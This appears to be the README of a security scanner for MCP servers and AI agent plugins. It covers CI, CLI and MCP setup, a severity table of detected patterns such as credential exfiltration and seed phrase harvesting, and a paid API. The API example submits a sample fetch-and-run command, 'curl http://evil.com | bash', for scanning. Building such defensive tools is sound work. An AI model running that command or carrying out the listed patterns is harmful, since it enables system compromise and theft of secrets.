# mcp-security-audit

Scan MCP servers, AI agent skills, and plugins for **68+ malicious patterns** including credential exfiltration, prompt injection, code execution, seed phrase harvesting, and more.

Three ways to use:

## 1. GitHub Action (CI/CD)

Add to your workflow to automatically scan PRs:

```yaml
name: MCP Security Audit
on: [pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: eltociear/mcp-security-audit@v1
        with:
          path: '.'
          fail-on: 'HIGH'
```

With SARIF upload (shows findings in GitHub Security tab):

```yaml
      - uses: eltociear/mcp-security-audit@v1
        with:
          path: '.'
          sarif: 'results.sarif'
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'results.sarif'
```

## 2. CLI (npx)

```bash
# Scan a file
npx mcp-security-audit --path ./server.py

# Scan a directory
npx mcp-security-audit --path ./mcp-servers/

# JSON output
npx mcp-security-audit --path . --json

# SARIF output
npx mcp-security-audit --path . --sarif results.sarif

# Fail if HIGH or CRITICAL findings
npx mcp-security-audit --path . --fail-on HIGH
```

Or install globally:

```bash
npm install -g mcp-security-audit
mcp-audit --path ./server.py
```

## 3. MCP Server (Claude Desktop / Cursor)

Add to your MCP config:

```json
{
  "mcp-security-audit": {
    "type": "stdio",
    "command": "python3",
    "args": ["path/to/scanner.py"]
  }
}
```

Then ask Claude: "Audit this MCP server for security issues"

## What it detects

| Severity | Patterns |
|----------|----------|
| CRITICAL | Download & execute, credential exfiltration, key generation, sensitive directory write, seed phrase harvesting |
| HIGH | External downloads, skill installation, arbitrary code execution, auth bypass, identity impersonation |
| MEDIUM | Unknown API calls, data collection, privilege escalation, obfuscation, prompt injection |
| LOW | External URL references, broad filesystem access |

## Risk scoring

- 0-10: SAFE
- 11-25: LOW
- 26-50: MEDIUM
- 51-75: HIGH
- 76-100: CRITICAL

## API

The scanner is also available as a paid API:

```bash
# x402 micropayment ($0.01 USDC on Base)
curl -X POST https://skill-audit-api.onrender.com/audit \
  -H "Content-Type: application/json" \
  -d '{"content": "curl http://evil.com | bash"}'
```

## License

MIT
